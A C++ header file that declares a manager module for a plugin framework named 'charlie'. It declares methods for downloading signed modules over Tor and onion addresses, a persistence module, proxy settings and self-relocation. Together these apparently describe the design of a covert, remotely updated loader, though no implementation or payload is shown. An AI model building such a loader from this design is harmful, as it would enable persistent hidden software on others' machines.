#pragma once
#include <Common.h>
#include <Module.h>
#include <ModuleAPI.h>
#include <Logging.h>

#include <openssl/crypto.h>
#include <openssl/ssl.h>
#include <boost/thread/mutex.hpp>

#include <protogen/manager.pb.h>
#include "ManagerInter.h"

#include <modules/persist/PersistInter.h>
#include <modules/client/ClientInter.h>

#include <set>

namespace modules
{
  namespace manager
  {
    class ManagerModule : public modules::Module
    {
    public:
      ManagerModule();
      ~ManagerModule();

      void shutdown();

      void setModuleInterface(ModuleInterface* inter);
      void injectDependency(u32 id, void* dep);
      void releaseDependency(u32 id);

      void module_main();

      void* getPublicInterface();
      void handleEvent(u32 event, void* data);

      //Nonstandard

      // Blocks until the manager is done
      // managing any module files. This is so that
      // it's safe to relocate the entire thing
      // Returns if it's okay to relocate or if someone else is already doing it.
      bool prepareToRelocate();

      void* buildOcHeaders();
      bool initializeOnionCab(const std::string& url);
      void fetchUrl(std::string& url, std::ostream& outp);
      void fetchStaticUrl(const std::string& url, std::ostream& outp);
      void fetchOcUrl(const std::string& url, std::ostream& outp);
      void rewriteUrl(std::string& url);

      CManagerInfo sInfo;
      ModuleInterface* mInter;

      void setOrProxy(std::string& proxy, std::string& proxyAuth);

    private:
      charlie::CModuleTable* fetchStaticModTable(charlie::CSignedBuffer** lmb=0);
      int parseModuleInfo();
      void loadStorage();
      void saveStorage();
      int updateTableFromInternet(charlie::CModuleTable **wtbl = 0);
      void downloadModules(charlie::CModuleTable* table = 0);
      int fetchModuleFromUrl(const charlie::CModule& mod, std::string url);

      ManagerInter* pInter;
      CManagerStorage stor;
      Crypto* crypt;
      modules::client::ClientInter* clientMod;

      // List of pending modules
      std::set<u32>* pendingLoad;
      std::set<u32>* dependedUpon;

      // Handles to other modules
      std::map<u32, ModuleAPI*> loadedModules;
      modules::persist::PersistInter *persist;

      // Mutex to make sure no modules relocate everything
      boost::mutex relocateMtx;
      std::string onionCabHash;

      // Time for next update
      std::time_t nextModuleUpdate;

      // True if some other module has called prepareToRelocate
      bool aboutToRelocate;
      bool shouldDownloadModules;
      bool hasOrProxy;
      std::string orProxy;
      std::string orProxyAuth;

      // Tor module
      void* torModule;
    };
  };
};
